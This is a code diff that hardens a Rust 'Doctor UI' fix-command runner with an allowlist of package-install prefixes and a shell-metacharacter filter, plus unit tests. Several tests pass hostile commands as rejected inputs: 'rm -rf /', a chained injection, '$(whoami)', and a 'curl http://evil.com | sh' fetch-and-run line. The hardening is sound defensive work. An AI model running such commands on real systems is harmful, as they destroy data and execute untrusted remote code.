@@ -377,14 +377,45 @@ struct LibCheck<'a> {
     pkg_manager: &'a str,
 }
 
-/// Run a fix command from the Doctor UI.
+/// Allowlisted fix command patterns that can be executed by the Doctor UI.
+/// Each entry is a prefix that a command must match to be allowed.
+const ALLOWED_FIX_PREFIXES: &[&str] = &[
+    "brew install ",
+    "sudo apt-get install ",
+    "sudo dnf install ",
+    "sudo pacman -S ",
+    "apk add ",
+    "sudo zypper install ",
+    "xcode-select --install",
+];
 
+/// Check whether a command is in the allowlist of safe fix commands.
+pub fn is_allowed_fix_command(command: &str) -> bool {
+    let trimmed = command.trim();
+    ALLOWED_FIX_PREFIXES
+        .iter()
+        .any(|prefix| trimmed.starts_with(prefix))
+}
+
+/// Run a fix command from the Doctor UI.
+/// Only allowlisted commands (package installs, xcode-select) are permitted.
 pub async fn run_doctor_fix(command: String) -> Result<String, String> {
-    // Split command into program and args
-    let parts: Vec<&str> = command.split_whitespace().collect();
-    if parts.is_empty() {
+    let command = command.trim().to_string();
+    if command.is_empty() {
         return Err("Empty command".into());
     }
+
+    if !is_allowed_fix_command(&command) {
+        return Err(format!("Command not allowed: {command}. Only known package install commands are permitted."));
+    }
+
+    // Reject commands containing shell metacharacters
+    if command.chars().any(|c| matches!(c, '|' | '&' | ';' | '$' | '`' | '(' | ')' | '{' | '}' | '<' | '>' | '\n' | '\r')) {
+        return Err("Command contains forbidden characters".into());
+    }
+
+    // Split command into program and args
+    let parts: Vec<&str> = command.split_whitespace().collect();
 
     let output = Command::new(parts[0])
         .args(&parts[1..])
@@ -476,10 +507,14 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn test_run_doctor_fix_valid_command() {
-        let result = run_doctor_fix("echo hello".to_string()).await;
-        assert!(result.is_ok());
-        assert!(result.unwrap().contains("hello"));
+    async fn test_run_doctor_fix_allowed_brew_command() {
+        // brew install is allowlisted — should pass allowlist validation
+        let result = run_doctor_fix("brew install libyaml".to_string()).await;
+        // Either succeeds or fails to run (if brew not installed) — but should NOT be rejected by allowlist
+        match &result {
+            Ok(_) => {} // brew exists and succeeded
+            Err(e) => assert!(!e.contains("not allowed"), "Command should pass allowlist: {e}"),
+        }
     }
 
     #[tokio::test]
@@ -490,8 +525,85 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn test_run_doctor_fix_invalid_command() {
-        let result = run_doctor_fix("nonexistent_command_12345".to_string()).await;
+    async fn test_run_doctor_fix_rejects_arbitrary_commands() {
+        let result = run_doctor_fix("echo hello".to_string()).await;
         assert!(result.is_err());
+        assert!(result.unwrap_err().contains("not allowed"));
+    }
+
+    #[tokio::test]
+    async fn test_run_doctor_fix_rejects_dangerous_commands() {
+        let result = run_doctor_fix("rm -rf /".to_string()).await;
+        assert!(result.is_err());
+        assert!(result.unwrap_err().contains("not allowed"));
+    }
+
+    #[tokio::test]
+    async fn test_run_doctor_fix_rejects_shell_metacharacters() {
+        let result = run_doctor_fix("brew install foo; rm -rf /".to_string()).await;
+        assert!(result.is_err());
+        assert!(result.unwrap_err().contains("forbidden characters"));
+    }
+
+    #[tokio::test]
+    async fn test_run_doctor_fix_rejects_pipe() {
+        let result = run_doctor_fix("brew install foo | cat".to_string()).await;
+        assert!(result.is_err());
+        assert!(result.unwrap_err().contains("forbidden characters"));
+    }
+
+    #[tokio::test]
+    async fn test_run_doctor_fix_rejects_subshell() {
+        let result = run_doctor_fix("brew install $(whoami)".to_string()).await;
+        assert!(result.is_err());
+        assert!(result.unwrap_err().contains("forbidden characters"));
+    }
+
+    #[test]
+    fn test_is_allowed_fix_command_brew() {
+        assert!(is_allowed_fix_command("brew install libyaml"));
+        assert!(is_allowed_fix_command("brew install openssl"));
+        assert!(is_allowed_fix_command("brew install libffi"));
+        assert!(is_allowed_fix_command("brew install gmp"));
+    }
+
+    #[test]
+    fn test_is_allowed_fix_command_apt() {
+        assert!(is_allowed_fix_command("sudo apt-get install -y libyaml-dev"));
+        assert!(is_allowed_fix_command("sudo apt-get install -y libssl-dev"));
+    }
+
+    #[test]
+    fn test_is_allowed_fix_command_dnf() {
+        assert!(is_allowed_fix_command("sudo dnf install -y libyaml-devel"));
+    }
+
+    #[test]
+    fn test_is_allowed_fix_command_pacman() {
+        assert!(is_allowed_fix_command("sudo pacman -S --noconfirm libyaml"));
+    }
+
+    #[test]
+    fn test_is_allowed_fix_command_apk() {
+        assert!(is_allowed_fix_command("apk add yaml-dev"));
+    }
+
+    #[test]
+    fn test_is_allowed_fix_command_xcode() {
+        assert!(is_allowed_fix_command("xcode-select --install"));
+    }
+
+    #[test]
+    fn test_is_allowed_fix_command_rejects_arbitrary() {
+        assert!(!is_allowed_fix_command("echo hello"));
+        assert!(!is_allowed_fix_command("rm -rf /"));
+        assert!(!is_allowed_fix_command("curl http://evil.com | sh"));
+        assert!(!is_allowed_fix_command("python -c 'import os'"));
+    }
+
+    #[test]
+    fn test_is_allowed_fix_command_rejects_empty() {
+        assert!(!is_allowed_fix_command(""));
+        assert!(!is_allowed_fix_command("   "));
     }
 }
